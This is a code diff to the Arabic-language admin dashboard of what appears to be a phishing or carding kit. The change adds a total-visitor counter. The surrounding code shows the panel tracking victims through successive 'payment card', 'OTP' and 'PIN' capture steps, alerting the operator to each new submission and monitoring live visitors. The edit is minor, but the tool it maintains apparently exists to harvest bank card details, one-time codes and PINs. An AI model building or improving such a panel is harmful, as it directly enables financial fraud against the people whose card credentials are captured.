@@ -267,7 +267,7 @@ var PC={pending:'#f59e0b',awaiting:'#7c3aed',stepok:'#3b82f6',confirmed:'#16a34a
 var STEPS={card:'بطاقة الدفع',otp:'رمز التحقق',pin:'الرقم السري'};
 var STEPC={card:'#0ea5e9',otp:'#f59e0b',pin:'#a855f7'};
 
-var PW=sessionStorage.getItem('admin_pw')||'',orders=[],onlineCount=0,visitorPages=[],
+var PW=sessionStorage.getItem('admin_pw')||'',orders=[],onlineCount=0,totalVisitors=0,visitorPages=[],
     selRef=null,sQ='',prevRefs=new Set(),delConfRef=null,detDelConf=false;
 
 function api(method,url,body){
@@ -327,7 +327,7 @@ function renderStats(){
   var active=orders.filter(isActive),done=orders.filter(function(o){return o.status==='confirmed';});
   var cards=[
     {label:'إجمالي الطلبات',value:orders.length,color:'#1B7A3D',bg:'rgba(27,122,61,0.1)',border:'rgba(27,122,61,0.25)',icon:'👥',fn:'scrollToOrders()',hint:'عرض الطلبات ↗'},
-    {label:'إجمالي الزوار',value:onlineCount,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'📊',fn:'openVM()',hint:'عرض التفاصيل ↗'},
+    {label:'إجمالي الزوار',value:totalVisitors,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'📊',fn:'openVM()',hint:'عرض التفاصيل ↗'},
     {label:'الزوار الحاليين',value:onlineCount,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'🌐',live:true,fn:'openVM()',hint:'المتصلين الآن ↗'},
     {label:'طلبات نشطة',value:active.length,color:'#3b82f6',bg:'rgba(59,130,246,0.1)',border:'rgba(59,130,246,0.25)',icon:'⚡',live:true,fn:'scrollToActive()',hint:'عرض النشطة ↗'},
     {label:'مكتملة',value:done.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅'}
@@ -342,7 +342,7 @@ function renderStats(){
       '<div class="sc-lb">'+c.label+'</div>'+hint+'</div>';
   }).join('');
   document.getElementById('tbV').textContent=orders.length;
-  document.getElementById('tbO').textContent=onlineCount;
+  document.getElementById('tbO').textContent=totalVisitors;
   document.getElementById('aCnt').textContent=active.length;
   document.getElementById('oCnt').textContent=orders.length;
 }
@@ -529,7 +529,7 @@ function loadOrders(){
     var nrefs=new Set(nw.map(function(o){return o.ref;}));
     if(prevRefs.size>0){var fresh=nw.filter(function(o){return!prevRefs.has(o.ref);});
       if(fresh.length){playSound();showNotif('🔔 طلب جديد: '+(fresh[0].n||'مجهول'));}}
-    prevRefs=nrefs;orders=nw;onlineCount=r.active||0;visitorPages=r.pages||[];
+    prevRefs=nrefs;orders=nw;onlineCount=r.active||0;totalVisitors=r.totalVisitors||0;visitorPages=r.pages||[];
     renderStats();renderActive();renderOrders();
     if(selRef){var o=orders.find(function(x){return x.ref===selRef;});if(o)renderDetail(o);else closeDetail();}
   }).catch(function(){});
@@ -544,13 +544,15 @@ function openVM(){
     '<button style="background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.25);color:#f87171" onclick="closeVM()">✕ إغلاق</button></div></div>';
 
   h+='<div class="modal-body">';
-  h+='<div class="vm-stats">'+
+  h+='<div class="vm-stats" style="grid-template-columns:repeat(4,1fr)">'+
+    '<div class="vm-sc" style="background:rgba(27,122,61,.1);border:1px solid rgba(27,122,61,.25)">'+
+    '<div class="n" style="color:#1B7A3D">'+orders.length+'</div><div class="l">إجمالي الطلبات</div></div>'+
     '<div class="vm-sc" style="background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.25)">'+
-    '<div class="n" style="color:#f59e0b">'+orders.length+'</div><div class="l">إجمالي الطلبات</div></div>'+
+    '<div class="n" style="color:#f59e0b">'+totalVisitors+'</div><div class="l">إجمالي الزوار</div></div>'+
     '<div class="vm-sc" style="background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25)">'+
     '<div class="n" style="color:#22c55e;display:flex;align-items:center;justify-content:center;gap:6px">'+
     '<span style="width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block"></span>'+onlineCount+'</div>'+
-    '<div class="l">الزوار المتصلين حالياً</div></div>'+
+    '<div class="l">الزوار الحاليين</div></div>'+
     '<div class="vm-sc" style="background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25)">'+
     '<div class="n" style="color:#3b82f6">'+activeOrd+'</div><div class="l">طلبات نشطة</div></div></div>';
 
@@ -577,7 +579,7 @@ function closeVM(){document.getElementById('vModal').classList.remove('show');do
 function resetAll(){
   if(!confirm('⚠️ هل أنت متأكد؟ سيتم حذف جميع الطلبات والزوار نهائياً!'))return;
   api('POST','/api/admin/reset').then(function(r){
-    orders=[];onlineCount=0;visitorPages=[];prevRefs=new Set();selRef=null;
+    orders=[];onlineCount=0;totalVisitors=0;visitorPages=[];prevRefs=new Set();selRef=null;
     renderStats();renderActive();renderOrders();closeDetail();closeVM();
     loadOrders();
     showNotif('✅ تم تصفير جميع البيانات — الطلبات: '+(r.deletedOrders||0));
